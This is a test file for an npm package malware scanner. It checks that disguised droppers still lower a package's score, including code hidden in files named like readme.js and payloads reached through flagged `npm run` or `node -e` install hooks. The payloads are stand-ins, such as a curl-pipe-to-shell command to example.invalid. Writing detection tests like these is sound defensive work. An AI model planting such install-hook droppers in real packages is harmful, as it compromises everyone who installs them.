// Ways a package with a clearly malicious pattern scored higher than the same pattern written another way: a payload
// named like a document, an `npm run` with flags or quotes, an inline eval after other flags. Payloads are stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, expandHooks, finalize, SCORE_FLOOR, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function scoreOf(manifest: AnalyzeInput["manifest"], files: Record<string, string>) {
  const m = { name: "probe-pkg", version: "1.0.0", license: "MIT", ...manifest };
  const all = [entry("package.json", JSON.stringify(m)), ...Object.entries(files).map(([p, t]) => entry(p, t))];
  const a: Analysis = analyze({ name: "probe-pkg", manifest: m, files: all, publisher: "a", previousPublishers: [] });
  const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

  return { score: r.score, ids: r.signals.map((s) => s.id) };
}

const DROPPER = "curl -s https://example.invalid/x.sh | sh";
const EXEC = (cmd: string): string => `require('child_process').execSync(${JSON.stringify(cmd)});\n`;

describe("a payload named like a document is still code", () => {
  for (const name of ["readme.js", "security.js", "history.js", "notice.js", "license.js", "lib/changes.js", "History.min.js", "notice.cjs"]) {
    test(`${name} holding a dropper is read, though nothing resolvable loads it`, () => {
      const r = scoreOf({ main: "index.js" }, { "index.js": "module.exports = 1;\n", [name]: EXEC(DROPPER) });

      expect(r.ids).toContain("remote-shell");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }

  test("a README.md with the same text is still not read", () => {
    const r = scoreOf({ main: "index.js" }, { "index.js": "module.exports = 1;\n", "README.md": `Install: \`${DROPPER}\`\n` });

    expect(r.ids).not.toContain("remote-shell");
  });
});

describe("an install script's `npm run` is followed whatever flags or quotes it has", () => {
  const variants = ["npm run -s payload", "npm run --silent payload", "npm --silent run payload", "npm run 'payload'", 'npm run "payload"', "yarn run -s payload", "pnpm --silent run payload", "bun run --silent payload"];

  test("npm run payload is the baseline: refused", () => {
    expect(scoreOf({ scripts: { postinstall: "npm run payload", payload: DROPPER } }, {}).ids).toContain("install-download");
  });

  for (const cmd of variants) {
    test(`postinstall: ${cmd}`, () => {
      const r = scoreOf({ scripts: { postinstall: cmd, payload: DROPPER } }, {});

      expect(r.ids).toContain("install-download");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }
});

describe("npm's --ignore-scripts runs the named script, not its pre and post scripts", () => {
  // checked with npm 11.19.1: `npm run --ignore-scripts payload` prints only payload's output
  const scriptsOf = (cmd: string) => expandHooks({ scripts: { postinstall: cmd, prepayload: DROPPER, payload: "echo ok", postpayload: DROPPER } })[0]?.scripts;

  for (const cmd of ["npm run --ignore-scripts payload", "npm --ignore-scripts run payload", "npm run --ignore-scripts=true payload"]) {
    test(`${cmd}: payload only`, () => {
      expect(scriptsOf(cmd)).toEqual(["postinstall", "payload"]);
      expect(scoreOf({ scripts: { postinstall: cmd, prepayload: DROPPER, payload: "echo ok", postpayload: DROPPER } }, {}).ids).not.toContain("install-download");
    });
  }

  test("the named script itself is still read", () => {
    expect(scoreOf({ scripts: { postinstall: "npm run --ignore-scripts payload", payload: DROPPER } }, {}).ids).toContain("install-download");
  });

  for (const cmd of ["npm run payload", "npm run --ignore-scripts=false payload", "yarn run --ignore-scripts payload"]) {
    test(`${cmd}: pre and post scripts still followed`, () => {
      expect(scriptsOf(cmd)).toEqual(["postinstall", "prepayload", "payload", "postpayload"]);
    });
  }
});

describe("node's inline-eval flag is recognised after other flags", () => {
  const code = "\"require('https').get('https://example.invalid/x')\"";
  const plain = scoreOf({ scripts: { postinstall: `node -e ${code}` } }, {});

  for (const cmd of [`node --no-warnings -e ${code}`, `node -pe ${code}`, `node --input-type=module -e ${code}`, `nodejs -e ${code}`, `echo --result=$(node -e ${code})`, `echo "$(node --no-warnings -e ${code})"`]) {
    test(cmd.slice(0, 40), () => {
      expect(scoreOf({ scripts: { postinstall: cmd } }, {}).score).toBe(plain.score);
    });
  }
});

describe("the flags a command may carry are read in linear time", () => {
  // each flag has one reading (`--a` is never `-` then `-a`), or a run of them that never matches backtracks exponentially;
  // and a flag value that names an interpreter (`--conditions=node`) must not start a fresh scan of the flags after it
  for (const cmd of [`node ${"--a ".repeat(40)}x`, `npm ${"--a=b ".repeat(40)}x`, `yarn ${"--a ".repeat(40)}`, `node ${"--conditions=node ".repeat(16000)}x`, `npm ${"--c=npm ".repeat(16000)}x`, `echo ${"a ".repeat(4_000_000)}`, `node ${"--a ".repeat(1_000_000)}x`]) {
    test(`${cmd.slice(0, 24)} (${cmd.length} chars)`, () => {
      const started = performance.now();

      expandHooks({ scripts: { postinstall: cmd } });
      expect(performance.now() - started).toBeLessThan(500);
    });
  }
});
